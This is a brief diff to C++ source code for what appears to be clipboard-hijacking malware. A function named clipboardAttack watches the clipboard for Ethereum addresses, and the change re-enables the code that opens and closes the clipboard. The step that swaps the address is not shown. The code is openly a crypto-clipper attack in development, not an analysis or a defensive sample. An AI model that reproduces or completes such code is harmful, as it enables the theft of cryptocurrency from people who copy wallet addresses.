@@ -81,10 +81,10 @@ void clipboardAttack(){
 	std::wstring cbText = getClipboardText();
 	if (cbText.compare(0, 2, L"0x") == 0 && cbText.find_first_not_of(L"0123456789abcdefABCDEF", 2) == std::string::npos && cbText.length() == 42){
 		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
-		/*if (OpenClipboard(NULL) == 0){
+		if (OpenClipboard(NULL) == 0){
 		std::cout << "Error in openclipboard" << std::endl;
-		}*/
-
+		}
+		CloseClipboard();
 	}
 }
 
